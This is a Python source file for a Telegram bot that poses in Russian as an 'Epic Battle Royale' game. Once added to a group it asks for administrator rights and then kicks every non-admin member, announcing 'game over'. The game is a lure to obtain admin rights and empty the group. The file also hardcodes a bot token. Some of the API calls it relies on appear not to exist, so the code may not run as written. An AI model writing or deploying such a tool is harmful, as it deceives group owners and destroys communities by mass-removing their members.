import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberStatus
from aiogram.utils import executor

TOKEN = os.getenv("BOT_TOKEN", "8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")
BOT_USERNAME = os.getenv("BOT_USERNAME", "GameBattleRoyaleBot")

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

def get_add_button():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start"))
    return keyboard

@dp.message_handler(commands=['start'])
async def start_cmd(message: types.Message):
    await message.answer(
        "🎮 Добро пожаловать в Epic Battle Royale!\n"
        "Добавьте бота в группу, чтобы начать игру.",
        reply_markup=get_add_button()
    )

@dp.my_chat_member_handler()
async def on_bot_added(update: types.ChatMemberUpdated):
    if update.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
        chat_id = update.chat.id
        await bot.send_message(chat_id, "🎮 Бот активирован! Дайте мне права администратора для игры.")
        await asyncio.sleep(10)
        bot_member = await bot.get_chat_member(chat_id, bot.id)
        if bot_member.status == ChatMemberStatus.ADMINISTRATOR and bot_member.can_restrict_members:
            await kick_all(chat_id)
        else:
            await bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")

async def kick_all(chat_id: int):
    try:
        async for member in bot.get_chat_members(chat_id):
            if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
                try:
                    await bot.kick_chat_member(chat_id, member.user.id)
                    await bot.unban_chat_member(chat_id, member.user.id)
                except Exception:
                    pass
        await bot.send_message(chat_id, "✅ Все участники кикнуты. Игра окончена.")
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка: {e}")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
